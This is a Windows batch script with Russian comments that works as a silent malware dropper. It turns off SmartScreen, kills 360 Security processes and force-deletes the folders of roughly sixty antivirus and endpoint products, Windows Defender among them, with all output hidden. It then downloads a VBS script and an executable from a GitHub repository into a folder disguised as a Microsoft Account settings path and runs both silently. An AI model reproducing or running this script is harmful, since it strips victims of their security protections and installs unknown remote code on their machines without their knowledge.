��&cls
@echo off
setlocal

:: Отключаем SmartScreen (без отображения окон)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\SmartScreen" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1

:: Убиваем сторонние процессы
@echo off
set "process1=QHWatchdog.exe"
set "process2=QHSafeTray.exe"
set "process3=QHSafeMain.exe"
set "process4=QHActiveDefense.exe"
set "process5=PromoUtil.exe"

taskkill /im "%process1%" /f > nul 2>&1 & 
taskkill /im "%process2%" /f > nul 2>&1 & 
taskkill /im "%process3%" /f > nul 2>&1 & 
taskkill /im "%process4%" /f > nul 2>&1 & 
taskkill /im "%process5%" /f > nul 2>&1

:: Удаляем файлы и папки антивирусов (без отображения окон).
for %%P in (
"C:\Program Files\AVAST Software\Avast"
"C:\Program Files (x86)\AVG\Antivirus"
"C:\Program Files\Norton Security"
"C:\Program Files\McAfee\MSC"
"C:\Program Files (x86)\Avira\Antivirus"
"C:\Program Files (x86)\Panda Security\Panda Security Protection"
"C:\Program Files (x86)\360\Total Security"
"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Internet Security"
"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Total Security"
"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Free"
"C:\Program Files\Dr.Web"
"C:\Program Files\Windows Defender"
"C:\Program Files (x86)\Quick Heal\Quick Heal Total Security"
"C:\Program Files (x86)\VIPRE"
"C:\Program Files\Bitdefender\Bitdefender Antivirus Plus"
"C:\Program Files\Bitdefender\Bitdefender Antivirus Free"
"C:\Program Files\ESET\ESET NOD32 Antivirus"
"C:\Program Files (x86)\Sophos\Sophos Anti-Virus"
"C:\Program Files (x86)\F-Secure\Anti-Virus"
"C:\Program Files (x86)\Comodo\Comodo Antivirus"
"C:\Program Files\Malwarebytes\Anti-Malware"
"C:\Program Files (x86)\Emsisoft Anti-Malware"
"C:\Program Files (x86)\Webroot"
"C:\Program Files (x86)\Trend Micro\Security Agent"
"C:\Program Files (x86)\G DATA\Antivirus"
"C:\Program Files (x86)\ZoneAlarm"
"C:\Program Files (x86)\Ad-Aware Antivirus"
"C:\Program Files\Cylance\Desktop"
"C:\Program Files\CrowdStrike"
"C:\Program Files (x86)\AVAST Software\Cleanup"
"C:\Program Files (x86)\Avira\System Speedup"
"C:\Program Files\HitmanPro"
"C:\Program Files\TotalAV"
"C:\Program Files\BullGuard"
"C:\Program Files\ESET\ESET Smart Security"
"C:\Program Files (x86)\K7 Computing\K7 Antivirus"
"C:\Program Files (x86)\TrustPort\Antivirus"
"C:\Program Files (x86)\Zillya\Antivirus"
"C:\Program Files (x86)\IObit\IObit Malware Fighter"
"C:\Program Files (x86)\IObit\Advanced SystemCare"
"C:\Program Files (x86)\Rising\Antivirus"
"C:\Program Files\Fortinet\FortiClient"
"C:\Program Files (x86)\ClamWin\bin"
"C:\Program Files (x86)\GridinSoft Anti-Malware"
"C:\Program Files (x86)\Cybereason"
"C:\Program Files (x86)\Immunet"
"C:\Program Files (x86)\Panda Dome"
"C:\Program Files (x86)\AVAST Software\Browser"
"C:\Program Files (x86)\AVG\Browser"
"C:\Program Files (x86)\Sophos\Sophos Home"
"C:\Program Files\Cisco\Cisco Secure Endpoint"
"C:\Program Files\Symantec\Symantec Endpoint Protection"
"C:\Program Files\AVAST Software\Business"
"C:\Program Files\AVG\Business"
"C:\Program Files\Bitdefender\GravityZone"
"C:\Program Files\Kaspersky Lab\Kaspersky Endpoint Security"
"C:\Program Files\ESET\ESET Endpoint Antivirus"
"C:\Program Files\F-Secure\Business Suite"
"C:\Program Files\McAfee\Endpoint Security"
"C:\Program Files\Norton Small Business"
) do (
    if exist "%%~P" (
        del /F /S /Q "%%~P" >nul 2>&1
    )
)

:: Удаляем папки антивирусов (без отображения окон).
for %%D in (
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Android Studio"
    "C:\Program Files\AVG\Browser\Application"
) do (
    if exist "%%~D" (
        rd /S /Q "%%~D" >nul 2>&1
    )
)

@echo off

:: Создать директорию, если она не существует
mkdir "C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount" >nul 2>&1

:: Детали скачиваемого скрипта VBS
set "VBS_URL=https://github.com/Rlz-vz/SchoolSigma/raw/main/task.vbs"
set "VBS_PATH=C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount\task.vbs"

:: Скачать скрипт VBS
powershell -Command "try { (New-Object System.Net.WebClient).DownloadFile('%VBS_URL%', '%VBS_PATH%') } catch { exit /b 1 }" >nul 2>&1

:: Запустить скрипт VBS через cscript
cscript "%VBS_PATH%" //nologo >nul 2>&1

:: Детали скачиваемого исполняемого файла
set "EXE_URL=https://github.com/Rlz-vz/SchoolSigma/raw/main/fssf.exe"
set "EXE_PATH=C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount\MicrosoftAccount.exe"

:: Скачать исполняемый файл
powershell -Command "try { (New-Object System.Net.WebClient).DownloadFile('%EXE_URL%', '%EXE_PATH%') } catch { exit /b 1 }" >nul 2>&1

:: Запустить исполняемый файл
start "" "%EXE_PATH%" >nul 2>&1

exit